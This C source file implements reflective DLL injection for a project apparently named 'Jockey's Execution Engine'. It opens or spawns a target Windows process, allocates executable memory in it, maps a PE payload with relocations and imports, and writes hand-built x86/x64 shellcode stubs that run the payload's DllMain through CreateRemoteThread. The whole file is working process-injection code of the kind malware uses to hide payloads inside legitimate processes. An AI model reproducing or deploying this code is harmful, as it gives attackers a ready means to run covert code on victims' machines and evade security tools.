/* ============================================================================
 * Jockey's Execution Engine -- reflective_dll.c
 * Reflective DLL injection with import resolution, relocations,
 * and architecture-aware remote stub execution. x86 + x64.
 * ============================================================================ */

#include "../include/injection.h"
#include "../include/pal.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32

#include <windows.h>
#include <winternl.h>

#pragma pack(push, 1)
typedef struct {
    WORD  e_magic;    WORD  e_cblp;     WORD  e_cp;
    WORD  e_crlc;     WORD  e_cparhdr;  WORD  e_minalloc;
    WORD  e_maxalloc; WORD  e_ss;       WORD  e_sp;
    WORD  e_csum;     WORD  e_ip;       WORD  e_cs;
    WORD  e_lfarlc;   WORD  e_ovno;     WORD  e_res[4];
    WORD  e_oemid;    WORD  e_oeminfo;  WORD  e_res2[10];
    LONG  e_lfanew;
} MY_DOS_HEADER, *PMY_DOS_HEADER;

typedef struct {
    WORD  Machine;           WORD  NumberOfSections;
    DWORD TimeDateStamp;     DWORD PointerToSymbolTable;
    DWORD NumberOfSymbols;   WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} MY_FILE_HEADER, *PMY_FILE_HEADER;

typedef struct {
    DWORD VirtualAddress;
    DWORD Size;
} MY_IMAGE_DATA_DIRECTORY, *PMY_IMAGE_DATA_DIRECTORY;

#ifdef _WIN64
typedef struct {
    WORD  Magic;             BYTE  MajorLinkerVersion;
    BYTE  MinorLinkerVersion;DWORD SizeOfCode;
    DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;   DWORD BaseOfCode;
    ULONGLONG ImageBase;     DWORD SectionAlignment;
    DWORD FileAlignment;     WORD  MajorOperatingSystemVersion;
    WORD  MinorOperatingSystemVersion; WORD  MajorImageVersion;
    WORD  MinorImageVersion; WORD  MajorSubsystemVersion;
    WORD  MinorSubsystemVersion; DWORD Win32VersionValue;
    DWORD SizeOfImage;       DWORD SizeOfHeaders;
    DWORD CheckSum;          WORD  Subsystem;
    WORD  DllCharacteristics;ULONGLONG SizeOfStackReserve;
    ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve;
    ULONGLONG SizeOfHeapCommit;  DWORD LoaderFlags;
    DWORD NumberOfRvaAndSizes;
    MY_IMAGE_DATA_DIRECTORY DataDirectory[16];
} MY_OPTIONAL_HEADER, *PMY_OPTIONAL_HEADER;
#else
typedef struct {
    WORD  Magic;             BYTE  MajorLinkerVersion;
    BYTE  MinorLinkerVersion;DWORD SizeOfCode;
    DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData;
    DWORD AddressOfEntryPoint;   DWORD BaseOfCode;
    DWORD BaseOfData;        DWORD ImageBase;
    DWORD SectionAlignment;  DWORD FileAlignment;
    WORD  MajorOperatingSystemVersion; WORD  MinorOperatingSystemVersion;
    WORD  MajorImageVersion; WORD  MinorImageVersion;
    WORD  MajorSubsystemVersion; WORD  MinorSubsystemVersion;
    DWORD Win32VersionValue; DWORD SizeOfImage;
    DWORD SizeOfHeaders;     DWORD CheckSum;
    WORD  Subsystem;         WORD  DllCharacteristics;
    DWORD SizeOfStackReserve;DWORD SizeOfStackCommit;
    DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit;
    DWORD LoaderFlags;       DWORD NumberOfRvaAndSizes;
    MY_IMAGE_DATA_DIRECTORY DataDirectory[16];
} MY_OPTIONAL_HEADER, *PMY_OPTIONAL_HEADER;
#endif

typedef struct {
    DWORD Signature;
    MY_FILE_HEADER FileHeader;
    MY_OPTIONAL_HEADER OptionalHeader;
} MY_NT_HEADERS, *PMY_NT_HEADERS;

typedef struct {
    BYTE  Name[8];
    union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc;
    DWORD VirtualAddress;    DWORD SizeOfRawData;
    DWORD PointerToRawData;  DWORD PointerToRelocations;
    DWORD PointerToLinenumbers; WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;  DWORD Characteristics;
} MY_SECTION_HEADER, *PMY_SECTION_HEADER;

typedef struct {
    DWORD VirtualAddress;
    DWORD SizeOfBlock;
} MY_BASE_RELOCATION, *PMY_BASE_RELOCATION;

typedef struct {
    DWORD OriginalFirstThunk; DWORD TimeDateStamp;
    DWORD ForwarderChain;     DWORD Name;
    DWORD FirstThunk;
} MY_IMAGE_IMPORT_DESCRIPTOR, *PMY_IMAGE_IMPORT_DESCRIPTOR;
#pragma pack(pop)

#define MY_IMAGE_DOS_SIGNATURE          0x5A4D
#define MY_IMAGE_NT_SIGNATURE           0x00004550
#define MY_IMAGE_DIRECTORY_ENTRY_IMPORT 1
#define MY_IMAGE_DIRECTORY_ENTRY_BASERELOC 5
#define MY_IMAGE_REL_BASED_ABSOLUTE     0
#define MY_IMAGE_REL_BASED_HIGHLOW      3
#define MY_IMAGE_REL_BASED_DIR64        10

#define MY_IMAGE_FIRST_SECTION(nt) ((PMY_SECTION_HEADER)((BYTE*)(nt) + \
    sizeof(DWORD) + sizeof(MY_FILE_HEADER) + (nt)->FileHeader.SizeOfOptionalHeader))

/* ------------------------------------------------------------------ */
static DWORD RvaToFileOffset(PMY_NT_HEADERS pNt, DWORD rva) {
    PMY_SECTION_HEADER pSection = MY_IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        DWORD start = pSection[i].VirtualAddress;
        DWORD end   = start + pSection[i].Misc.VirtualSize;
        if (end < start) continue;
        if (rva >= start && rva < end) {
            return pSection[i].PointerToRawData + (rva - start);
        }
    }
    return 0xFFFFFFFF;
}

/* ------------------------------------------------------------------ */
static BOOL ResolveImportsEx(HANDLE hProcess, LPVOID remoteBase,
                             PMY_NT_HEADERS pNtHeaders, BYTE* pLocalBuffer) {
    DWORD importRVA = pNtHeaders->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD importSize = pNtHeaders->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    if (importRVA == 0 || importSize == 0) return TRUE;
    if (importSize < sizeof(MY_IMAGE_IMPORT_DESCRIPTOR)) return FALSE;

    DWORD importOff = RvaToFileOffset(pNtHeaders, importRVA);
    if (importOff == 0xFFFFFFFF) return FALSE;

    PMY_IMAGE_IMPORT_DESCRIPTOR pDesc = (PMY_IMAGE_IMPORT_DESCRIPTOR)(pLocalBuffer + importOff);
#ifdef _WIN64
    typedef ULONGLONG MY_THUNK;
#else
    typedef DWORD MY_THUNK;
#endif

    while (pDesc->Name != 0) {
        DWORD nameRVA = pDesc->Name;
        DWORD nameOff = RvaToFileOffset(pNtHeaders, nameRVA);
        if (nameOff == 0xFFFFFFFF) return FALSE;

        char* dllName = (char*)(pLocalBuffer + nameOff);
        int nameLen = 0;
        while (nameLen < 256 && dllName[nameLen] != '\0') nameLen++;
        if (nameLen == 0 || nameLen >= 256) return FALSE;

        HMODULE hDll = GetModuleHandleA(dllName);
        if (!hDll) hDll = LoadLibraryA(dllName);
        if (!hDll) return FALSE;

        DWORD origThunkRVA = pDesc->OriginalFirstThunk;
        DWORD firstThunkRVA = pDesc->FirstThunk;
        if (origThunkRVA == 0) origThunkRVA = firstThunkRVA;

        DWORD thunkOff = RvaToFileOffset(pNtHeaders, origThunkRVA);
        if (thunkOff == 0xFFFFFFFF) return FALSE;

        MY_THUNK* pThunk = (MY_THUNK*)(pLocalBuffer + thunkOff);
        int idx = 0;
        const int maxImports = 0xFFFF;

        while (*pThunk != 0 && idx < maxImports) {
            MY_THUNK val = *pThunk;
            FARPROC func = NULL;
            if (val & (sizeof(MY_THUNK)==8 ? 0x8000000000000000 : 0x80000000)) {
                WORD ord = (WORD)(val & 0xFFFF);
                func = GetProcAddress(hDll, (LPCSTR)(ULONG_PTR)ord);
            } else {
                DWORD nameRVA2 = (DWORD)val;
                DWORD nameOff2 = RvaToFileOffset(pNtHeaders, nameRVA2);
                if (nameOff2 == 0xFFFFFFFF) return FALSE;
                char* funcName = (char*)(pLocalBuffer + nameOff2 + 2);
                int funcNameLen = 0;
                while (funcNameLen < 256 && funcName[funcNameLen] != '\0') funcNameLen++;
                if (funcNameLen == 0 || funcNameLen >= 256) return FALSE;
                func = GetProcAddress(hDll, funcName);
            }
            if (!func) return FALSE;

            LPVOID iatAddr = (BYTE*)remoteBase + firstThunkRVA + (idx * sizeof(MY_THUNK));
            if (!WriteProcessMemory(hProcess, iatAddr, &func, sizeof(MY_THUNK), NULL))
                return FALSE;

            pThunk++; idx++;
        }
        pDesc++;
    }
    return TRUE;
}

/* ------------------------------------------------------------------ */
static BOOL ExecuteRemoteDll(HANDLE hProcess, LPVOID remoteBase, DWORD entryRVA) {
    if (entryRVA == 0) {
        LOG_INFO("[!] No entry point defined in DLL\n");
        return TRUE;
    }

    LPVOID pDllMain = (BYTE*)remoteBase + entryRVA;
    LOG_INFO("[+] Remote DllMain address: %p\n", pDllMain);

    size_t totalSize = 4096;
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, totalSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        LOG_INFO("[-] VirtualAllocEx for stub failed: %lu\n", GetLastError());
        return FALSE;
    }

#ifdef _WIN64
    /* x64 stub: sub rsp,0x28 | mov rcx,remoteBase | mov edx,1 | xor r8,r8 |
     *           mov rax,pDllMain | call rax | add rsp,0x28 | ret */
    unsigned char stub[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0,0,0,0,0,0,0,0,
        0xBA, 0x01, 0x00, 0x00, 0x00,
        0x4D, 0x31, 0xC0,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(ULONG_PTR*)(stub + 6)  = (ULONG_PTR)remoteBase;
    *(ULONG_PTR*)(stub + 24) = (ULONG_PTR)pDllMain;
#else
    /* x86 stub: push ebp | mov ebp,esp | push 0 | push 1 | push remoteBase |
     *           call pDllMain | leave | ret 0xC */
    unsigned char stub[] = {
        0x55,
        0x89, 0xE5,
        0x6A, 0x00,
        0x6A, 0x01,
        0x68, 0,0,0,0,
        0xB8, 0,0,0,0,
        0xFF, 0xD0,
        0x89, 0xEC,
        0x5D,
        0xC2, 0x0C, 0x00
    };
    *(DWORD*)(stub + 9)  = (DWORD)remoteBase;
    *(DWORD*)(stub + 14) = (DWORD)pDllMain;
#endif

    if (!WriteProcessMemory(hProcess, remoteMem, stub, sizeof(stub), NULL)) {
        LOG_INFO("[-] Failed to write stub to remote memory\n");
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)(uintptr_t)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        LOG_INFO("[-] CreateRemoteThread for stub failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    LOG_INFO("[+] Remote thread spawned for DllMain. Waiting...\n");
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    LOG_INFO("[+] DllMain executed successfully\n");
    return TRUE;
}

/* ------------------------------------------------------------------ */
int perform_reflective_injection(InjectionConfig* config) {
    if (!config || !config->payload || config->payloadSize < sizeof(MY_DOS_HEADER)) {
        LOG_ERROR( "[-] Invalid config or payload too small\n");
        return -1;
    }

    BYTE* pLocalBuffer = (BYTE*)config->payload;
    PMY_DOS_HEADER pDos = (PMY_DOS_HEADER)pLocalBuffer;
    if (pDos->e_magic != MY_IMAGE_DOS_SIGNATURE) {
        LOG_ERROR( "[-] Invalid DOS signature\n");
        return -1;
    }
    if (pDos->e_lfanew < 0x40 ||
        (size_t)pDos->e_lfanew + sizeof(MY_NT_HEADERS) > config->payloadSize) {
        LOG_ERROR( "[-] Invalid e_lfanew or truncated payload\n");
        return -1;
    }

    PMY_NT_HEADERS pNt = (PMY_NT_HEADERS)(pLocalBuffer + pDos->e_lfanew);
    if (pNt->Signature != MY_IMAGE_NT_SIGNATURE) {
        LOG_ERROR( "[-] Invalid NT signature\n");
        return -1;
    }

    HANDLE hProcess = NULL;
    DWORD pid = config->targetPid;
    BOOL createdSuspended = FALSE;

    if (pid == 0) {
        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        if (!CreateProcessA(NULL, (LPSTR)config->targetImage, NULL, NULL, FALSE,
                            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            LOG_ERROR( "[-] CreateProcess failed: %lu\n", GetLastError());
            return -1;
        }
        pid = pi.dwProcessId;
        hProcess = pi.hProcess;
        CloseHandle(pi.hThread);
        createdSuspended = TRUE;
        LOG_INFO("[+] Created suspended process PID: %lu\n", pid);
    } else {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            LOG_ERROR( "[-] OpenProcess failed: %lu\n", GetLastError());
            return -1;
        }
        LOG_INFO("[+] Opened process PID: %lu\n", pid);
    }

    SIZE_T imageSize = pNt->OptionalHeader.SizeOfImage;
    LPVOID preferredBase = (LPVOID)(uintptr_t)pNt->OptionalHeader.ImageBase;

    LPVOID remoteBase = VirtualAllocEx(hProcess, preferredBase, imageSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        remoteBase = VirtualAllocEx(hProcess, NULL, imageSize,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteBase) {
            LOG_ERROR( "[-] VirtualAllocEx failed: %lu\n", GetLastError());
            CloseHandle(hProcess);
            return -1;
        }
        LOG_INFO("[+] Allocated at fallback: %p\n", remoteBase);
    } else {
        LOG_INFO("[+] Allocated at preferred base: %p\n", remoteBase);
    }

    DWORD headersSize = pNt->OptionalHeader.SizeOfHeaders;
    if (headersSize > config->payloadSize) {
        LOG_ERROR( "[-] SizeOfHeaders exceeds payload size\n");
        goto fail;
    }
    if (!WriteProcessMemory(hProcess, remoteBase, pLocalBuffer, headersSize, NULL)) {
        LOG_ERROR( "[-] WriteProcessMemory (headers) failed\n");
        goto fail;
    }

    PMY_SECTION_HEADER pSection = MY_IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (BYTE*)remoteBase + pSection[i].VirtualAddress;
        LPVOID src  = pLocalBuffer + pSection[i].PointerToRawData;
        if (pSection[i].SizeOfRawData > 0) {
            if (pSection[i].PointerToRawData + pSection[i].SizeOfRawData > config->payloadSize) {
                LOG_ERROR( "[-] Section data exceeds payload size\n");
                goto fail;
            }
            if (!WriteProcessMemory(hProcess, dest, src, pSection[i].SizeOfRawData, NULL)) {
                LOG_ERROR( "[-] Write section [%s] failed\n", pSection[i].Name);
                goto fail;
            }
            LOG_INFO("[+] Section [%s] written\n", pSection[i].Name);
        }
    }

    DWORD relocRVA = pNt->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD relocSize = pNt->OptionalHeader.DataDirectory[MY_IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    if (remoteBase != preferredBase) {
        if (relocRVA == 0 || relocSize == 0) {
            PMY_SECTION_HEADER pSec = MY_IMAGE_FIRST_SECTION(pNt);
            for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
                char name[9] = {0};
                memcpy(name, pSec[i].Name, 8);
                if (strcmp(name, ".reloc") == 0) {
                    relocRVA = pSec[i].VirtualAddress;
                    relocSize = pSec[i].Misc.VirtualSize;
                    break;
                }
            }
            if (relocRVA == 0 || relocSize == 0) {
                LOG_ERROR( "[-] No relocs and base changed -- cannot relocate\n");
                goto fail;
            }
        }

        DWORD relocOff = RvaToFileOffset(pNt, relocRVA);
        if (relocOff == 0xFFFFFFFF) {
            LOG_ERROR( "[-] Invalid relocation offset\n");
            goto fail;
        }

        BYTE* pRelocDir = pLocalBuffer + relocOff;
        DWORD off = 0;
        while (off < relocSize) {
            PMY_BASE_RELOCATION pBlock = (PMY_BASE_RELOCATION)(pRelocDir + off);
            if (pBlock->SizeOfBlock == 0) break;
            if (pBlock->SizeOfBlock < sizeof(MY_BASE_RELOCATION) || off + pBlock->SizeOfBlock > relocSize) {
                LOG_ERROR( "[-] Invalid relocation block\n");
                goto fail;
            }
            DWORD entryCount = (pBlock->SizeOfBlock - sizeof(MY_BASE_RELOCATION)) / sizeof(WORD);
            WORD* pEntry = (WORD*)(pBlock + 1);
            LONGLONG delta = (BYTE*)remoteBase - (BYTE*)preferredBase;

            for (DWORD j = 0; j < entryCount; j++) {
                WORD type = pEntry[j] >> 12;
                WORD off2 = pEntry[j] & 0xFFF;
                if (type == MY_IMAGE_REL_BASED_ABSOLUTE) continue;
#ifdef _WIN64
                if (type != MY_IMAGE_REL_BASED_DIR64) continue;
#else
                if (type != MY_IMAGE_REL_BASED_HIGHLOW) continue;
#endif
                LPVOID patchAddr = (BYTE*)remoteBase + pBlock->VirtualAddress + off2;
                ULONG_PTR val = 0;
                if (!ReadProcessMemory(hProcess, patchAddr, &val, sizeof(ULONG_PTR), NULL)) {
                    LOG_ERROR( "[-] Read reloc failed\n");
                    goto fail;
                }
                val += delta;
                if (!WriteProcessMemory(hProcess, patchAddr, &val, sizeof(ULONG_PTR), NULL)) {
                    LOG_ERROR( "[-] Write reloc failed\n");
                    goto fail;
                }
            }
            off += pBlock->SizeOfBlock;
        }
        LOG_INFO("[+] Relocations applied\n");
    } else {
        LOG_INFO("[+] No relocations needed\n");
    }

    if (!ResolveImportsEx(hProcess, remoteBase, pNt, pLocalBuffer)) {
        LOG_ERROR( "[-] Import resolution failed\n");
        goto fail;
    }

    if (createdSuspended) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            typedef LONG (NTAPI *NtResumeProcess_t)(HANDLE);
            union {
                FARPROC proc;
                NtResumeProcess_t fn;
            } ntResumeProcess = { .proc = GetProcAddress(hNtdll, "NtResumeProcess") };
            if (ntResumeProcess.proc) {
                LONG st = ntResumeProcess.fn(hProcess);
                if (st >= 0) LOG_INFO("[+] Process resumed before stub\n");
            }
        }
    }

    DWORD entryRVA = pNt->OptionalHeader.AddressOfEntryPoint;
    if (!ExecuteRemoteDll(hProcess, remoteBase, entryRVA)) {
        LOG_ERROR( "[-] Remote DllMain execution failed\n");
        goto fail;
    }

    LOG_INFO("[+] Reflective DLL injection succeeded\n");
    CloseHandle(hProcess);
    return 0;

fail:
    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
    if (createdSuspended) TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return -1;
}

#else
int perform_reflective_injection(InjectionConfig* config) {
    (void)config;
    LOG_ERROR( "[-] Reflective DLL injection not implemented on Linux\n");
    return -1;
}
#endif
